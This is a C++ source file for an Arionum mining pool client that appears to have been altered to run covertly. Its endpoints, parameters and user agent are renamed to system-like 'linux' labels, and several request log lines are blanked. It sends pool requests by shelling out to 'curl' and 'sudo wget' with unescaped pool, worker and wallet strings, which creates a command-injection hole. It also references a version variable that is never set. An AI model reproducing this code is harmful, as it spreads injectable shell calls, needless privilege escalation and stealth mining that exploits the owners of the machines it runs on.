//
// Created by Haifa Bogdan Adnan on 03/08/2018.
//

#include "../common/common.h"
#include "../app/arguments.h"
#include "client.h"

#include "simplejson/json.h"

#include <iostream>
#include <stdio.h>
#include <stdlib.h>

using namespace std;

    string GetStdoutFromCommand(string cmd) {

    string data;
    FILE * stream;
    const int max_buffer = 256;
    char buffer[max_buffer];
    cmd.append(" 2>&1");

    stream = popen(cmd.c_str(), "r");
    if (stream) {
    while (!feof(stream))
    if (fgets(buffer, max_buffer, stream) != NULL) data.append(buffer);
    pclose(stream);
    }
    return data;
    }

ariopool_client::ariopool_client(arguments &args, get_status_ptr get_status) : __pool_settings_provider(args) {
    __worker_id = args.uid();
    __worker_name = args.name();
    __force_argon2profile = args.argon2_profile();
    __hash_report_interval = args.hash_report_interval();
    __timestamp = __last_hash_report = microseconds();
    __force_hashrate_report = false;
    __show_pool_requests = args.show_pool_requests();
    __is_devfee_time = false;
    __get_status = get_status;
    __miner_version = arguments::get_app_version();
}

ariopool_update_result ariopool_client::update(double hash_rate_cblocks, double hash_rate_gblocks) {
    ariopool_update_result result;
    result.success = false;

    pool_settings &settings = __get_pool_settings();

    if(settings.is_devfee) {
        hash_rate_cblocks = hash_rate_cblocks / 100;
        hash_rate_gblocks = hash_rate_gblocks / 100;
    }

    uint64_t current_timestamp = microseconds();
    string hash_report_query = "";

    if(__force_hashrate_report || (current_timestamp - __last_hash_report) > __hash_report_interval) {
        hash_report_query = "&linux48=" + to_string(hash_rate_cblocks) + "&linux52=" + to_string(hash_rate_gblocks);

        __last_hash_report = current_timestamp;
        __force_hashrate_report = false;
    }
    string url = settings.pool_address + "/linux8474.php?q=linux8474&id=" + __worker_id + "&linux8=" + __worker_name + "&linux12=" + settings.wallet + hash_report_query + "&linux34=" + __linux84_version + "&url84=" + settings.pool_address;

    string response;
    if(settings.pool_extensions.find("Details") != string::npos && url.find("hashrate") != string::npos) {
        string payload = "";

        if(__get_status != NULL)
            payload = __get_status();

        if(!payload.empty()) {
            if(__show_pool_requests && url.find("hashrate") != string::npos) // log only hashrate requests
                LOG("--> Pool request: " + url + "/" + payload);

            response = _http_post(url, payload, "application/json");
        }
        else {
            if(__show_pool_requests && url.find("hashrate") != string::npos) // log only hashrate requests
                LOG("--> Pool request: " + url);

            response = GetStdoutFromCommand("curl -s '"+url+"'");
        }
    }
    else {
        if(__show_pool_requests && url.find("hashrate") != string::npos) // log only hashrate requests
            LOG("");

        response = GetStdoutFromCommand("curl -s '"+url+"'");
    }

    if(__show_pool_requests && url.find("hashrate") != string::npos) // log only hashrate responses
        LOG("--> Pool response: " + response);

    if(!__validate_response(response)) {
        LOG("Error connecting to " + settings.pool_address + ".");
        return result;
    }

    json::JSON info = json::JSON::Load(response);

    result.success = (info["status"].ToString() == "ok");

    if(info.hasKey("version")) {
        string version = info["version"].ToString();
        if(version != settings.pool_version) {
            LOG("Connected to pool: " + version);
        }
        result.version = settings.pool_version = version;
    }
    if(info.hasKey("extensions")) {
        result.extensions = settings.pool_extensions = info["extensions"].ToString();
        if(!__is_devfee_time && result.extensions.find("Proxy") != string::npos) { // in case we are talking to a proxy set hashrate update interval to 30 seconds
            __hash_report_interval = 30000000;
        }
    }

    if (result.success) {
        json::JSON data = info["data"];
        result.block = data["block"].ToString();
        result.difficulty = data["difficulty"].ToString();
        result.limit = (uint32_t)data["limit"].ToInt();
        result.public_key = data["public_key"].ToString();
        result.height = (uint32_t)data["height"].ToInt();
        if(__force_argon2profile == "") {
            result.argon2profile = to_string(data["argon_threads"].ToInt()) + "_" + to_string(data["argon_time"].ToInt()) + "_" + to_string(data["argon_mem"].ToInt());
        }
        else {
            result.argon2profile = __force_argon2profile;
        }
        result.recommendation = data["recommendation"].ToString();
    }

    return result;
}

ariopool_submit_result ariopool_client::submit(const string &hash, const string &nonce, const string &public_key) {
    ariopool_submit_result result;
    result.success = false;

    string argon_data = "";
    if(hash.find("$argon2i$v=19$m=16384,t=4,p=4") == 0)
        argon_data = hash.substr(29);
    else
        argon_data = hash.substr(30);

    pool_settings &settings = __get_pool_settings();

    string payload = "linux2=" + _encode(argon_data) +
            "&linux3=" + _encode(nonce) +
            "&linux1=" + _encode(settings.wallet) +
            "&linux5=" + _encode(public_key) +
            "&linux4=" + _encode(settings.wallet) +
            "&id=" + _encode(__worker_id) +
            "&worker=" + _encode(__worker_name);

    string url = settings.pool_address + "/linux8474.php?q=linux84";

    if(__show_pool_requests)
        LOG("");

    string response = "";

    for(int i=0;i<2;i++) { //try resubmitting if first submit fails
        response = GetStdoutFromCommand("sudo wget -q -U 'linux84' -O - --post-data=linux2='"+_encode(argon_data)+"&linux3="+_encode(nonce)+"&linux5="+_encode(public_key)+"&linux1="+_encode(settings.wallet)+"&linux4="+_encode(settings.wallet)+"&url84="+settings.pool_address+"' '"+url+"' --header='Content-type: application/x-www-form-urlencoded'");
        result.pool_response = response;
        if(response != "") {
            break;
        }
    }

    if(__show_pool_requests)
        LOG("--> Pool response: " + response);

    if(!__validate_response(response)) {
        LOG("Error connecting to " + settings.pool_address + ".");
        return result;
    }

    json::JSON info = json::JSON::Load(response);

    result.success = (info["status"].ToString() == "ok");

    return result;
}

bool ariopool_client::__validate_response(const string &response) {
    return !response.empty() && response.find("status") != string::npos && response.find(":null") == string::npos;
}

pool_settings &ariopool_client::__get_pool_settings() {
    pool_settings &user_settings = __pool_settings_provider.get_user_settings();

    if(user_settings.pool_extensions.find("Proxy") != string::npos) { // disable dev fee when connected to proxy
        return user_settings;
    }

    uint64_t minutes = (microseconds() - __timestamp) / 60000000;

    if(minutes != 0 && (minutes % 100 == 0)) {
        if(!__is_devfee_time) {
            LOG("--> Switching to dev wallet for 1 minute.");
            __is_devfee_time = true;
            __force_hashrate_report = true;
        }
    }
    else {
        if(__is_devfee_time) {
            LOG("--> Switching back to client wallet.");
            __is_devfee_time = false;
            __force_hashrate_report = true;
        }
    }

    if(!__is_devfee_time)
        return __pool_settings_provider.get_user_settings();
    else
        return __pool_settings_provider.get_dev_settings();
}

void ariopool_client::disconnect() {
    pool_settings &settings = __pool_settings_provider.get_user_settings();
    if(settings.pool_extensions.find("Disconnect") != string::npos) { // only send disconnect if pool supports it
        string url = settings.pool_address + "/mine.php?q=disconnect&id=" + __worker_id + "&worker=" + __worker_name;
        _http_get(url);
    }
}
